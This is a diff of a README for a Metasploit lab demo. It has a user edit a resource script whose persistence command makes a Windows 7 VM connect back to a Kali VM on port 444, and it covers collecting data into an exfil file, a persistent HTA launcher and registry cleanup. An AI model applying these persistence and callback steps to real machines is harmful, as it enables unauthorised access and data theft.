@@ -120,8 +120,18 @@ less /opt/unicorn-demo/README.md
 
 ### Unicorn Demo Assumptions
 
-Before running the demo.rc make sure you edit the file and update the IP address to that of your Kali VM so the persistence connects back   
-You can modify this however you want but I found that trying to run everything in the script dies after creating a shell and some commands cause a keyboard buffering problem, so I only do base collection in the script and upload the Launcher.hta and JAWS script.  
+You can modify this however you want but I found that trying to run everything in the script dies after creating a shell and some commands cause a keyboard buffering problem, so I only do base collection in the script, upload the JAWS powershell script, and make my threat persistent.  
+
+## Update demo.rc
+
+If you are not familiar with vi here is a quick guide. https://www.thegeekdiary.com/basic-vi-commands-cheat-sheet/  
+Use vi or your favorite text editor to modify the /opt/unicorn-demo/demo.rc file.  
+
+```
+vi /opt/unicorn-demo/demo.rc
+```
+In vi you can hit `i` to interact, cursor to the IP address, make your changes, hit the `esc` key, and enter `:wq` to save and quit  
+Modify the line `run persistence -A -X -p 444 172.16.105.131` to match your Kali VM IP and save your changes.  
 
 ## Start the Metasploit listener
 
@@ -148,7 +158,6 @@ run /opt/unicorn-demo/demo.rc
 ```
 
 That completes the commands in my demo.rc script.  
-**The final command leaves a randomly generated key name in `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run` which runs a VBscript that must be deleted before rerunning the script. This is on purpose as the last command in demo.rc makes the threat peristent on system boot**
 Next we will interact with the Windows shell, commands must be executed one at a time.
 
 ```
@@ -194,3 +203,10 @@ less /opt/exfil.txt
 
 If you have followed this precisely you should have gathered plenty of system information, have a exfil.txt file in /opt, Launcher.hta should now be persitent by being in the users Start Menu > Startup.  
 Reboot your Windows 7 VM to test, it should reconnect as session 2 after you login.
+
+## Cleanup
+
+The final command in demo.rc leaves a randomly generated key name in `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`.  
+This runs a VBscript that must be deleted before rerunning the demo.rc script.  
+This is on purpose as the last command in demo.rc makes the threat peristent on system boot.  
+If this registry key exists multiple times or is not removed you may recieved a VBscript error when you login. 
